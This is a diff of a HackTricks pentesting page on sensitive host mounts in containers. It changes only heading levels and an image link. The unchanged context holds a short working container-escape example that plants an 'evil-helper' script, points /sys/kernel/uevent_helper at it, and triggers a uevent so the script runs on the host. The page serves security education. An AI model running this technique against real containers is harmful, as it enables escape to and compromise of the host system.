@@ -14,7 +14,7 @@ Other ways to support HackTricks:
 
 </details>
 
-<figure><img src="../../../..https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://websec.nl/" %}
 
@@ -138,23 +138,23 @@ This directory permits access to modify kernel variables, usually via `sysctl(2)
 * Writing to `/sys/kernel/uevent_helper` can execute arbitrary scripts upon `uevent` triggers.
 *   **Example for Exploitation**: %%%bash
 
-    ### Creates a payload
+    #### Creates a payload
 
     echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper
 
-    ### Finds host path from OverlayFS mount for container
+    #### Finds host path from OverlayFS mount for container
 
     host\_path=$(sed -n 's/._\perdir=(\[^,]_).\*/\1/p' /etc/mtab)
 
-    ### Sets uevent\_helper to malicious helper
+    #### Sets uevent\_helper to malicious helper
 
     echo "$host\_path/evil-helper" > /sys/kernel/uevent\_helper
 
-    ### Triggers a uevent
+    #### Triggers a uevent
 
     echo change > /sys/class/mem/null/uevent
 
-    ### Reads the output
+    #### Reads the output
 
     cat /output %%%
 
@@ -187,7 +187,7 @@ This directory permits access to modify kernel variables, usually via `sysctl(2)
 * [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc\_group\_understanding\_hardening\_linux\_containers-1-1.pdf)
 * [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container\_whitepaper.pdf)
 
-<figure><img src="../../../..https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://websec.nl/" %}
 
